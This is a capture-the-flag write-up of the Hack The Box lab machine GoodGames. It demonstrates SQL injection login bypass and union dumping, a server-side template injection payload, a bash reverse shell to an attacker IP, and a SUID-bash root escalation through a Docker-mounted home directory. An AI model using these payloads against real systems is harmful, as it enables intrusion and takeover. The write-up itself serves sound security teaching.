---
title: HTB: GoodGames
url: https://0xdf.gitlab.io/2022/02/23/htb-goodgames.html
date: 2022-02-23T10:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-goodgames, hackthebox, ctf, uni-ctf, vhosts, sqli, sqli-bypass, sqli-union, feroxbuster, burp, burp-repeater, ssti, docker, escape, docker-mount, htb-bolt
---

![GoodGames](https://0xdfimages.gitlab.io/img/goodgames-cover.png)

GoodGames has some basic web vulnerabilities. First there’s a SQL injection that allows for both a login bypass and union injection to dump data. The admin’s page shows a new virtualhost, which, after authing with creds from the database, has a server-side template injection vulnerability in the name in the profile, which allows for coded execution and a shell in a docker container. From that container, I’ll find the same password reused by a user on the host, and SSH to get access. On the host, I’ll abuse the home directory that’s mounted into the container and the way Linux does file permissions and ownership to get a shell as root on the host.

## Box Info

| Name | [GoodGames](https://hackthebox.com/machines/goodgames)  [GoodGames](https://hackthebox.com/machines/goodgames) [Play on HackTheBox](https://hackthebox.com/machines/goodgames) |
| --- | --- |
| Release Date | [21 Feb 2022](https://twitter.com/hackthebox_eu/status/1495828181781200898) |
| Retire Date | 21 Feb 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` finds only one open TCP port, HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.130
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-20 18:36 UTC
Nmap scan report for 10.10.11.130
Host is up (0.10s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds
oxdf@hacky$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.130
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-20 18:40 UTC
Nmap scan report for 10.10.11.130
Host is up (0.086s latency).

PORT   STATE SERVICE  VERSION
80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.33 seconds

```

The version information doesn’t betray any hints as to what OS this might be.

### Website - TCP 80

#### Site

The site is about video games:

[![image-20220220134937216](https://0xdfimages.gitlab.io/img/image-20220220134937216.png)](https://0xdfimages.gitlab.io/img/image-20220220134937216.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220220134937216.png)

Most the links on the page just point back to the page itself, but there are links to “Blog” (`/blog`) and “Store” (`/coming-soon`). In the footer there’s a reference to “GoodGames.HTB”:

![image-20220220135346942](https://0xdfimages.gitlab.io/img/image-20220220135346942.png)

I’ll add that to my hosts file, and try a `wfuzz` brute force on additional subdomains, but it all seems to return the same site.

The “Blog” site looks similar, but none of the links actually go anywhere (not even to posts):

[![image-20220220141857961](https://0xdfimages.gitlab.io/img/image-20220220141857961.png)](https://0xdfimages.gitlab.io/img/image-20220220141857961.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220220141857961.png)

The Store link just has a coming soon message (that likely counted down to the boxes original release for the University CTF):

![image-20220220141952043](https://0xdfimages.gitlab.io/img/image-20220220141952043.png)

Putting in junk to the email box and clicking subscribe complains that it’s not a valid email:

![image-20220220142036440](https://0xdfimages.gitlab.io/img/image-20220220142036440.png)

Once I give it a valid email, the subscribe button just does nothing.

#### Tech Stack

`nmap` identified the webserver as “Werkzeug/2.0.2 Python/3.9.2”. That’s from the HTTP response headers:

```

HTTP/1.1 200 OK
Date: Sun, 20 Feb 2022 19:21:27 GMT
Server: Werkzeug/2.0.2 Python/3.9.2
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Content-Length: 10524
Connection: close

```

It’s clear this site is running on Python 3.9.2, but not much else from there.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, with no extensions given the site is in Python:

```

oxdf@hacky$ feroxbuster -u http://goodgames.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://goodgames.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET      267l      548w     9265c Got 200 for http://goodgames.htb/8ec386322be14334a15ff3153feb0541 (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 9265 responses; toggle this behavior by using --dont-filter
WLD      GET      267l      548w     9265c Got 200 for http://goodgames.htb/aa92f00415da4b20b8b4d582f0e26ae795d6f95f76574326861468d1615078bc74f0b3c5b6d540b2b43b456a138c7972 (url length: 96)
302      GET        4l       24w      208c http://goodgames.htb/logout => http://goodgames.htb/
200      GET      267l      553w     9294c http://goodgames.htb/login
200      GET      909l     2572w    44212c http://goodgames.htb/blog
200      GET      267l      545w     9267c http://goodgames.htb/profile
200      GET      728l     2070w    33387c http://goodgames.htb/signup
200      GET      730l     2069w    32744c http://goodgames.htb/forgot-password
403      GET        9l       28w      278c http://goodgames.htb/server-status
200      GET      287l      620w    10524c http://goodgames.htb/coming-soon
200      GET      267l      553w     9294c http://goodgames.htb/password-reset
[####################] - 1m     29999/29999   0s      found:11      errors:2      
[####################] - 1m     30001/29999   324/s   http://goodgames.htb 

```

There’s a few new paths in there having to do with account creation.

#### Creating Account

I actually missed it on initial enumeration, but there’s a little user icon at the top right of the page:

![image-20220220142850062](https://0xdfimages.gitlab.io/img/image-20220220142850062.png)

Clicking on it pops a sign-in box:

![image-20220220142914483](https://0xdfimages.gitlab.io/img/image-20220220142914483.png)

The “Sign up” link opens a new page, `/signup`:

[![image-20220220145026893](https://0xdfimages.gitlab.io/img/image-20220220145026893.png)](https://0xdfimages.gitlab.io/img/image-20220220145026893.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220220145026893.png)

On creating an account, it then allows me to sign in. The first page shows success:

![image-20220220145236642](https://0xdfimages.gitlab.io/img/image-20220220145236642.png)

After five seconds, it redirects to `/profile` (due to this HTML header, `<meta http-equiv="refresh" content="5; url=/profile" />`):

[![image-20220220145321397](https://0xdfimages.gitlab.io/img/image-20220220145321397.png)](https://0xdfimages.gitlab.io/img/image-20220220145321397.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220220145321397.png)

The “Edit Details” form doesn’t seem to work, as whatever I put in returns HTTP 500, server error.

## Shell as root in Container

### SQL Injection

#### Get Request

Despite being able to log in, it’s worth checking the login form for SQL injection. The client-side JavaScript requires a valid email address to submit. But that doesn’t stop me from intercepting that request in Burp. I’ll right click and select “Send to Repeater”:

[![image-20220220151750259](https://0xdfimages.gitlab.io/img/image-20220220151750259.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220220151750259.png)

When I successfully log in, there’s a 200 response, with a cookie set, and the title “Login Success”:

[![image-20220220151923944](https://0xdfimages.gitlab.io/img/image-20220220151923944.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220220151923944.png)

Further down the page, it says “Welcome 0xdf”:

![image-20220220152042333](https://0xdfimages.gitlab.io/img/image-20220220152042333.png)

#### Bypass

I’ll try changing the user to a simple SQL injection, and it works:

[![image-20220220152114053](https://0xdfimages.gitlab.io/img/image-20220220152114053.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220220152114053.png)

It is worth noting that submitting `email=' or 1=1-- -;` will not work. I think this is because of how Python handles MySQL queries, specifically from [Real Python](https://realpython.com/python-mysql/#creating-a-new-database):

> **Note:** In MySQL, it’s mandatory to put a semicolon (`;`) at the end of a statement, which denotes the termination of a query. However, MySQL Connector/Python automatically appends a semicolon at the end of your queries, so there’s no need to use it in your Python code.

I’ll intercept the login, replace the username with the SQL payload, and after five seconds, I’m redirected to `/profile` for Admin:

![image-20220221214518440](https://0xdfimages.gitlab.io/img/image-20220221214518440.png)

#### Dump Data

On the page that shows before it redirects, it’s worth noting the welcome message:

![image-20220220152440168](https://0xdfimages.gitlab.io/img/image-20220220152440168.png)

Because my query selects all users, it seems to have just jammed them together. Because a column is being displayed back to me, I can likely UNION inject this to dump the full DB.

If I change the username in Burp Repeater to a union injection payload, I’ll guess at the number of fields until I find that four works. On submitting `' union select 1,2,3,4-- -`, it says “Welcome 4”:

![image-20220221220550131](https://0xdfimages.gitlab.io/img/image-20220221220550131.png)

I can get the current database, “main”:

![image-20220221220828012](https://0xdfimages.gitlab.io/img/image-20220221220828012.png)

There’s only two databases “main” and “information\_schema”:

![image-20220221220955820](https://0xdfimages.gitlab.io/img/image-20220221220955820.png)

“main” has three tables:

![image-20220221221220282](https://0xdfimages.gitlab.io/img/image-20220221221220282.png)

“user” seems the most interesting. It has four columns:

![image-20220221221320248](https://0xdfimages.gitlab.io/img/image-20220221221320248.png)

There’s two users in the DB:

![image-20220221221616025](https://0xdfimages.gitlab.io/img/image-20220221221616025.png)

#### Crack Password

A quick Google for the hash for admin shows it breaks to the password “superadministrator”:

![image-20220221221832256](https://0xdfimages.gitlab.io/img/image-20220221221832256.png)

### SSTI

#### Enumeration / Access

At the top right of the admin’s page, there’s an extra gear icon. It’s a link to `http://internal-administration.goodgames.htb/login`. I’ll add that to my `/etc/hosts` and the visit the page. It’s a login form:

![image-20220221220325920](https://0xdfimages.gitlab.io/img/image-20220221220325920.png)

The username “admin” with password “superadministrator” works to get in. The site presents a dashboard:

[![image-20220221221942949](https://0xdfimages.gitlab.io/img/image-20220221221942949.png)](https://0xdfimages.gitlab.io/img/image-20220221221942949.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220221221942949.png)

There’s a bunch of functionality on the site that doesn’t do anything. But profile page is interesting. I can update the admin’s name to whatever I want:

![image-20220221222119983](https://0xdfimages.gitlab.io/img/image-20220221222119983.png)

#### Tech Stack

The headers on this site are the same, still Python:

```

HTTP/1.1 200 OK
Date: Wed, 23 Feb 2022 12:01:51 GMT
Server: Werkzeug/2.0.2 Python/3.6.7
Content-Type: text/html; charset=utf-8
Vary: Cookie,Accept-Encoding
Set-Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiYjJlZjM2ZmY1MmYyMTViYTE3MWExY2EwZDJhYWE3MjJkNDc4NmVkYyJ9.YhYiLw.SY2uUMb7cHAxWkDC_CqKdW3Td0s; HttpOnly; Path=/
Connection: close
Content-Length: 13603

```

#### POC

Given the webserver is Python, server-side template injection (SSTI) is a common flaw to look for. To check for SSTI, I’ll give the standard payload, `{{ 7 * 7 }}`. The name updates to 49:

![image-20220221222257539](https://0xdfimages.gitlab.io/img/image-20220221222257539.png)

That’s an excellent sign that the site is vulnerable to SSTI.

#### Execution POC

Just like in the recently retired box [Bolt](/2022/02/19/htb-bolt.html#ssti), I can try a simple payload to see if I can get system execution via this SSTI:

```

{{ namespace.__init__.__globals__.os.popen('id').read() }}

```

On submitting that as the name, the result returns:

![image-20220221222444916](https://0xdfimages.gitlab.io/img/image-20220221222444916.png)

Not only is that execution, but as root!

#### Shell

I’ll use the same payload to get a reverse shell:

```

{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read() }}

```

On submitting, it hangs, but there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.130 45016
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend#

```

I’ll use the `script` trick to get a better shell:

```

root@3a453ab39d3d:/backend# script /dev/null -c bash
script /dev/null -c bash            
Script started, file is /dev/null
root@3a453ab39d3d:/backend# ^Z                 
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@3a453ab39d3d:/backend#

```

There’s also a single user with `user.txt`:

```

root@3a453ab39d3d:/home/augustus# cat user.txt
e897d18e************************

```

## Shell as augustus on GoodGames

### Enumeration

#### Container

It’s pretty clear that I’m in a Docker container. For one, I’m already root, but just found `user.txt`. The `ifconfig` shows an IP of 172.19.0.2 on eth0.

There’s a `.dockerenv` file in the filesystem root:

```

root@3a453ab39d3d:~# ls -a /
.   .dockerenv  bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
..  backend     boot  etc  lib   media  opt  root  sbin  sys  usr

```

There are some more subtle things as well. The permissions on files in `/home/augustus` are showing user ids instead of names:

```

root@3a453ab39d3d:/home/augustus# ls -la
total 24
drwxr-xr-x 2 1000 1000 4096 Dec  2 23:51 .
drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root    9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19 11:16 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19 11:16 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19 11:16 .profile
-rw-r----- 1 root 1000   33 Feb 22 02:41 user.txt

```

There is no user augustus or user 1000 in `/etc/passwd`:

```

root@3a453ab39d3d:~# cat /etc/passwd | grep 1000
root@3a453ab39d3d:~# cat /etc/passwd | grep augustus

```

That’s an indication that this home directory is mounted into the container from the host. `mount` confirms that:

```

root@3a453ab39d3d:~# mount | grep augustus
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)

```

#### Network

A quick ping sweep of the class C shows only one other host:

```

root@3a453ab39d3d:~# for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.124 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.087 ms

```

It’s a safe guess that .1 is the Docker host.

A quick port scan shows it’s listening on 22 and 80:

```

root@3a453ab39d3d:~# for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null           
22 open
80 open

```

A quick `curl` of `172.19.0.1` returns the website, which suggests that port is being forwarded back to this container through the host.

### SSH

I’ll check for password reuse, and it works for augustus on the host:

```

root@3a453ab39d3d:~# ssh augustus@172.19.0.1 
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password:
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$

```

## Shell as root

### Enumeration

#### Host

This shell does seem to be on GoodGames itself. The IP matches the machine’s IP:

```

augustus@GoodGames:~$ hostname -I
10.10.11.130 172.19.0.1 172.17.0.1 dead:beef::250:56ff:feb9:809b 

```

Docker is in the process list, and it matches what I suspected from the container’s point of view:

```

augustus@GoodGames:~$ ps auxww | grep docker
root       908  0.0  2.1 1457176 86204 ?       Ssl  02:40   0:09 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      1246  0.0  0.2 1222636 9616 ?        Sl   02:40   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8085 -container-ip 172.19.0.2 -container-port 8085

```

#### Home Directory

Augustus’ home directory looks the same as what I saw in the container:

```

augustus@GoodGames:~$ ls -la
total 24
drwxr-xr-x 2 augustus augustus 4096 Dec  2 23:51 .
drwxr-xr-x 3 root     root     4096 Oct 19 12:16 ..
lrwxrwxrwx 1 root     root        9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus  220 Oct 19 12:16 .bash_logout
-rw-r--r-- 1 augustus augustus 3526 Oct 19 12:16 .bashrc
-rw-r--r-- 1 augustus augustus  807 Oct 19 12:16 .profile
-rw-r----- 1 root     augustus   33 Feb 22 02:41 user.txt

```

```

root@3a453ab39d3d:/home/augustus# ls -la
total 24
drwxr-xr-x 2 1000 1000 4096 Dec  2 23:51 .
drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root    9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19 11:16 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19 11:16 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19 11:16 .profile
-rw-r----- 1 root 1000   33 Feb 22 02:41 user.txt

```

The file sizes and times are exactly the same (almost - I cannot explain why three of the files are off by an hour). If I create a file on the host:

```

augustus@GoodGames:~$ touch from_host

```

It shows up on the container:

```

root@3a453ab39d3d:/home/augustus# ls -l from_host 
-rw-r--r-- 1 1000 1000 0 Feb 22 15:16 from_host

```

And it works the other way:

```

root@3a453ab39d3d:/home/augustus# touch from_container

```

```

augustus@GoodGames:~$ ls -l from_container 
-rw-r--r-- 1 root root 0 Feb 22 15:16 from_container

```

Interestingly, the file created from the container is owned by root, and the host treats it as it’s root!

### Shell

I’ll copy `/bin/bash` into augustus’ home directory on the host. It’s important to use `bash` from the host (I’ll cover why in [Beyond Root](#beyond-root)).

```

augustus@GoodGames:~$ cp /bin/bash .

```

Then in the container, I’ll change the owner to root, and set the permissions to be SUID:

```

root@3a453ab39d3d:/home/augustus# ls -l bash 
-rwxr-xr-x 1 1000 1000 1234376 Feb 22 15:25 bash
root@3a453ab39d3d:/home/augustus# chown root:root bash 
root@3a453ab39d3d:/home/augustus# chmod 4777 bash 
root@3a453ab39d3d:/home/augustus# ls -l bash
-rwsrwxrwx 1 root root 1234376 Feb 22 15:25 bash

```

Back on GoodGames, the changes are reflected:

```

augustus@GoodGames:~$ ls -l bash 
-rwsrwxrwx 1 root root 1234376 Feb 22 15:25 bash

```

Running it (with `-p` so that privileges aren’t dropped) returns a root shell:

```

augustus@GoodGames:~$ ./bash -p
bash-5.1# 

```

And I can fetch the flag:

```

bash-5.1# cat /root/root.txt
820d1e82************************

```

## Beyond Root

The first time I tried to escalate here, I copied the `bash` binary from in the container into augustus’ home directory and made it SUID:

```

root@3a453ab39d3d:/home/augustus# cp /bin/bash .
root@3a453ab39d3d:/home/augustus# chmod 4777 bash 
root@3a453ab39d3d:/home/augustus# ls -l bash 
-rwsrwxrwx 1 root root 1099016 Feb 22 15:18 bash

```

It shows up the same way on GoodGames:

```

augustus@GoodGames:~$ ls -l bash 
-rwsrwxrwx 1 root root 1099016 Feb 22 15:18 bash

```

But running it errors out:

```

augustus@GoodGames:~$ ./bash -p
./bash: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory

```

Running `ldd` shows how this binary loads libraries:

```

augustus@GoodGames:~$ ldd bash 
        linux-vdso.so.1 (0x00007ffc64194000)
        libtinfo.so.5 => not found
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fa964fc8000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa964e03000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa964fd7000)

```

It clearly shows that `libtinfo.so.5` is not found. The standard `bash` binary on the host is using `libtinfo.so.6`:

```

augustus@GoodGames:~$ ldd /bin/bash
        linux-vdso.so.1 (0x00007ffd31e97000)
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f28239dd000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f28239d7000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2823812000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f2823b4e000)

```